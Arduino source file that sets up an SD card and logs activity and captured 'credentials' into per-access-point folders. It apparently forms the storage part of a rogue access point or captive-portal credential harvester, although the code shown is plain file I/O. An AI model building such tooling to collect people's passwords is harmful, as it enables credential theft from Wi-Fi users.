#include <RTCZero.h>
#include <SD.h>

#define SD_PIN 6

String log_file_name = F("");
String records_file_name = F("");
File logfile, records;

bool SDAvailable = false, filesOpen = false;

void SDSetup() {
  Serial.println(F("Try to configure the SD!"));
  if (!SD.begin(SD_PIN)){
    Serial.println(F("Something went wrong!"));
    return;
  }
  SDAvailable = true;
  Serial.println(F("SD Setup completed!"));
}

int getFileCount(String dir)
{
	File d = SD.open(dir);
	int count_files = 0;
	while(d.openNextFile())
    count_files++;
  d.close();
  return count_files;
}

void StartSDActivity(String APName){
  Serial.println(F("Start SD ACtivity"));
  if (!SDAvailable){
    Serial.println(F("ERROR: SD seems to be not available!!!"));
    return;
  }
  
  String APfolder = "logs/" + APName;
  String filecheck = APfolder + "/check.txt";
  if (!SD.exists(filecheck)) {
    SD.mkdir(APfolder);
    SD.open(filecheck, FILE_WRITE).close();
  }

  // RTCZero rtc;
  String partialFileName;
  partialFileName = "_" + String(getFileCount(APfolder)); //String(rtc.getHours()) + String(rtc.getMinutes()) + String(rtc.getSeconds());

  log_file_name = APfolder + "/" + String(partialFileName) + ".log";
  records_file_name = APfolder + "/" + String(partialFileName) + ".txt";
  logfile = SD.open(log_file_name, FILE_WRITE);
  if (!logfile){
    Serial.println(F("ERROR: Cannot open log file"));
    return;
  }
  records = SD.open(records_file_name, FILE_WRITE);
  if (!records){
    Serial.println(F("ERROR: Cannot open record file"));
    return;
  }
  filesOpen = true;
  Serial.println(F("SD ACtivity Started"));
}

void StopSDActivity(){
  if (!SDAvailable)
    return;
  logfile.close();
  records.close();
  filesOpen = false;
}

void RecordLog(String logline, bool newline){
  if (!SDAvailable || !filesOpen || !logfile)
    return;
  if (newline)
    logfile.println(logline);
  else
    logfile.print(logline);
  logfile.flush();
}

void RecordCredentials(String credential){
  if (!SDAvailable || !filesOpen || !records)
    return;
  records.println(credential);
  records.flush();
}
